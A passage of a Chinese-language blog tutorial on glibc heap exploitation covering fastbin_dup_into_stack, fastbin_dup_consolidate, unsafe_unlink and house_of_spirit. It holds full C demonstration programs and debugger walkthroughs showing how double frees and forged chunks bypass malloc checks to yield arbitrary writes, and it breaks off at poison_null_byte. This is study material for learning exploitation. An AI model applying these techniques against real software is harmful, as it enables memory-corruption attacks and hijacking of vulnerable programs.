class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n&quot;</span>, f);<br>    <span class="hljs-keyword">char</span>* g = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(g, <span class="hljs-string">&quot;GGGGGGGG&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这一次 malloc(8) 就申请到了栈上去: %p\n&quot;</span>, g);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack</p><p>​    这个程序展示了怎样通过修改fd指针，将其指向一个伪造的free chunk，在伪造的地址处malloc出一个chunk。该程序大部分内容都和上一个程序一样，漏洞也同样是double-free，只有给 fd 填充的内容不一样。</p><p>​    三次malloc之后</p><p> <img src="https://s2.loli.net/2021/12/26/yS1GaoiTJD6dL7k.png"></p><p>​    三次 free 之后，可以看到由于 double free 造成的循环的指针。</p><p> <img src="https://s2.loli.net/2021/12/26/ip2LPoaBOdmU9bY.png"></p><p>​    这时候我们再去malloc两次，还剩一个指向chunk a的free chunk，而前面我们也申请到了指向它的 chunk d，可以通过它编辑chunk a的fd 指针，填充一个有意义的地址：栈地址减0x8（因为伪造的chunk要有个 size，size在&amp;stack_var - 0x8的位置上）</p><p>​    <code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></p><p>   通过调试我们可以看到，地址为<code>0x603000</code>的<code>chunk</code>的<code>fd</code>指针指向的是栈上的地址，这样的话，malloc一次之后再次申请的时候就会申请到fd指针指向的0x7fffffffdac0</p><p> <img src="https://s2.loli.net/2021/12/26/zyAWqFnrboTB2X9.png"></p><p>最后可以看到我们已经分配栈上的内存，并写入了数据GGGGGGGG。</p><p> <img src="https://s2.loli.net/2021/12/26/1VnfpvsWY9HIq4K.png"></p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>这个程序展示了利用在large bin的分配中malloc_consolidate 机制绕过 fastbin对double free的检查，这个检查在 fastbin_dup中已经展示过了，只不过它利用的是在两次 free 中间插入一次对其它chunk的free。</p><p>​    源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p1, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p2, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先 free p1\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-keyword">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p4, <span class="hljs-string">&quot;CCCCCCC&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p5, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n&quot;</span>, p4, p5);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    运行结果。</p><p> <img src="https://s2.loli.net/2021/12/26/BjUekKNVGlQXFJW.png"></p><p>​    首先分配两个fastbin范围内的chunk。</p><p> <img src="https://s2.loli.net/2021/12/26/4ywNIAQ9JtSiejq.png"></p><p>​    释放掉p1，则空闲的chunk进入fastbin</p><p> <img src="https://s2.loli.net/2021/12/26/Zy6USAriPhuIRgK.png"></p><p>​    此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：</p><p> <img src="https://s2.loli.net/2021/12/26/y74YorLXn1PRiMJ.png"></p><p>   可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。</p><p>​    看一下large chunk的分配过程：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">     While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">     even seeing if there is space available, this avoids</span><br><span class="hljs-comment">     fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">     Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">     large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">     invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">     it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>      idx = largebin_index (nb);<br><span class="hljs-keyword">if</span>(have_fastchunks (av))<br>        malloc_consolidate (av);<br>&#125;<br></code></pre></td></tr></table></figure><p>   在分配large chunk的时候，首先会根据chunk的大小来获取对应的 large bin的index，然后判断fast bins中有没有chunk，如果有就调用 malloc_consolidate()合并fast bins中的chunk，然后放到unsorted bin 中。unsorted bin中的chunk 会按照大小放到small或large bins中</p><p>   p1已经不再fastbin的顶部，所以可以再次free。那么p1再次被free之后既在small bins又在fast bins。</p><p> <img src="https://s2.loli.net/2021/12/26/EXB6RlLAI9hNeoi.png"></p><p>  再一次 malloc 之后会从 fast bins 中分配</p><p>  void *p4 = malloc(0x10);</p><p>  strcpy(p4, “CCCCCCC”);</p><p>​    可以看到堆块被写入了CCCCCCC。</p><p> <img src="https://s2.loli.net/2021/12/26/FDcqGbesp4BZoUt.png"></p><p>  再一次就是从 small bins 中分配</p><p>  void *p5 = malloc(0x10);</p><p>  strcpy(p5, “DDDDDDDD”);</p><p> <img src="https://s2.loli.net/2021/12/26/xo5yCTlZS2fzkdY.png"></p><p>​    可以看到堆块的内容被覆盖成DDDDDDDD了，这是因为p4和p5被分配在了同一个地方，修改p5处的内容其实就是修改p4处的内容。</p><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-keyword">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当您在已知位置有指向某个区域的指针时，可以调用 unlink\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//要足够大来避免进入 fastbin</span><br>    <span class="hljs-keyword">int</span> header_size = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n&quot;</span>);<br><br>    chunk0_ptr = (<span class="hljs-keyword">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-keyword">uint64_t</span> *chunk1_ptr  = (<span class="hljs-keyword">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;全局变量 chunk0_ptr 在 %p, 指向 %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想要破坏的 chunk 在 %p\n&quot;</span>, chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在 chunk0 那里伪造一个 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;next_free_chunk&#x27; (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint64_t</span>)*<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;previous_free_chunk&#x27; (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint64_t</span>)*<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 fd: %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 bk: %p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n&quot;</span>);<br>    <span class="hljs-keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n&quot;</span>);<br>    <span class="hljs-keyword">char</span> victim_string[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">uint64_t</span>) victim_string;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;之前的值是: %s\n&quot;</span>,victim_string);<br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;新的值是: %s\n&quot;</span>,victim_string);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即unsafe unlink。</p><p>​    运行一下看看</p><p> <img src="https://s2.loli.net/2021/12/26/xdJGagBlwskFinf.png"></p><p>​    unlink有一个保护检查机制，在解链操作之前，针对堆块P自身的fd和bk 检查了链表的完整性，即判断堆块P的前一块fd的指针是否指向P，以及后一块bk的指针是否指向 P。</p><p>​    malloc_size设置为0x80，可以分配small chunk，然后定义header_size为2。申请两块空间，全局指针chunk0_ptr指向chunk0，局部指针chunk1_ptr 指向 chunk1。先在main函数上设置一个断点，然后单步走下一步，走到20行。</p><p>​    我们来看一下，申请了两个堆之后的情况。</p><p> <img src="https://s2.loli.net/2021/12/26/ZC1GbzYuLrhTHV7.png"></p><p> <img src="https://s2.loli.net/2021/12/26/jG4UgWJpoimCnFB.png"></p><p>接下来要绕过 (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False的检查，这个检查有个缺陷，就是fd/bk指针都是通过与chunk头部的相对地址来查找的，所以我们可以利用全局指针chunk0_ptr构造fake chunk来绕过它。</p><p>再单步走到40行。</p><p> <img src="https://s2.loli.net/2021/12/26/yVOo9LlKQU3zZjX.png"></p><p>​    可以看到，我们在chunk0里构造一个fake chunk，用P表示，两个指针fd 和bk可以构成两条链：P-&gt;fd-&gt;bk == P，P-&gt;bk-&gt;fd == P，可以绕过检查。另外利用chunk0的溢出漏洞，通过修改chunk 1的 prev_size为fake chunk的大小，修改 PREV_INUSE标志位为0，将fake chunk伪造成一个free chunk。</p><p> <img src="https://s2.loli.net/2021/12/26/Sbfe9uoiYKvVp3P.png"></p><p>​    我们的fake chunk的fd指向0x602058，然后0x602058的bk指向0x603010。fake chunk的bk指向0x602060，然后0x602060的fd指向 0x603010，可以保证前后都指向我们伪造的这个 chunk，完美！</p><p>​    接下来释放掉chunk1，因为fake chunk和chunk1是相邻的一个free chunk，所以会将他两个合并，这就需要对fake chunk进行unlink，进行如下操作：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd <br>BK = P-&gt;bk<br>FD-&gt;bk = BK <br>   BK-&gt;fd = FD<br></code></pre></td></tr></table></figure><p>​    根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd = &amp;P - <span class="hljs-number">24B</span>K = P-&gt;bk = &amp;P - <span class="hljs-number">16F</span>D-&gt;bk = *(&amp;P - <span class="hljs-number">24</span> + <span class="hljs-number">24</span>) = PFD-&gt;fd = *(&amp;P - <span class="hljs-number">16</span> + <span class="hljs-number">16</span>) = P<br></code></pre></td></tr></table></figure><p>这样就通过了 unlink 的检查，最终效果为：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk = P = BK = &amp;P - <span class="hljs-number">16B</span>K-&gt;fd = P = FD = &amp;P - <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>​    也就是说，chunk0_ptr 和 chunk0_ptr[3] 现在指向的是同一个地址</p><p> <img src="https://s2.loli.net/2021/12/26/oNGmvz9xDElKc73.png"></p><p>   在这个图示中最终实现的效果是ptr中存的是ptr-0x18，如果本来ptr 是存的一个指针的，现在它指向了ptr-0x18。如果编辑这里的内容就可以往ptr-0x18那里去写，实现了覆盖这个指针为任意值的效果。</p><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p>   house_of_spirit是一种fastbins攻击方法，通过构造fake chunk，然后将其free掉，就可以在下一次malloc时返回fake chunk的地址，即任意我们可控的区域。House_of_spirit是一种通过堆的fast bin机制来辅助栈溢出的方法，一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制EIP来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被free的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个fast bin块的元数据，接着在free操作时，这个栈上的堆块被放到fast bin中，下一次malloc对应的大小时，由于fast bin的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个fake chunk。所以 fake chunk的伪造是关键。</p><p>   源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a, *b;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);<br>        <span class="hljs-comment">// 这是fake_chunks[?]可以数一下</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br>    fake_chunks[<span class="hljs-number">2</span>] = <span class="hljs-number">0x4141414141414141</span>LL;<br>    fake_chunks[<span class="hljs-number">10</span>] = <span class="hljs-number">0x4141414141414141</span>LL;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free!\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, b);<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4242424242424242</span>LL;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ok!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -g house_of_spirit.c -o house_of_spirit<br></code></pre></td></tr></table></figure><p>​    首先在程序的第 14 行下个断点</p><p>  运行到这里可以看到 fake_chunk 目前还没有被我们写入。</p><p> <img src="https://s2.loli.net/2021/12/26/wDyOdNUXPuYReb3.png"></p><p>   我们直接让他写完，再来看一下，已经构造出fake chunk了。</p><p> <img src="D:\blog\source_posts\images\image-20211226160833206-16405140388341.png"></p><p>对fake chunk进行free之后。</p><p> <img src="https://s2.loli.net/2021/12/26/6jPLABEZuC5l3y7.png"></p><p>可以看一下fastbin，现在已经有了我们构造的哪个fake chunk了。</p><p> <img src="https://s2.loli.net/2021/12/26/SOMy7DpWr5Hgaj1.png"></p><p>   接下来再次malloc一个相同大小的chunk就会把fastbin中的fake chunk申请过去。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);b[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4242424242424242</span>LL;<br></code></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2021/12/26/YDqzityo6njvwJh.png"></p><p>   伪造chunk时需要绕过一些检查，首先是标志位，<code>PREV_INUSE</code> 位并不影响 free的过程，但 <code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零。其次，在64位系统中fast chunk的大小要在 32~128 字节之间。最后，是next chunk的大小，必须大于 <code>2*SIZE_SZ</code>（即大于16），小于 <code>av-&gt;system_mem</code>（即小于128kb），才能绕过对next chunk大小的检查。</p><p>​    所以house_of_spirit的主要目的是，当我们伪造的fake chunk内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk里填充一些字母，但在现实中这些位置很可能是不可控的，而house_of_spirit也正是以此为目的而出现的。</p><h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><p>​    源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 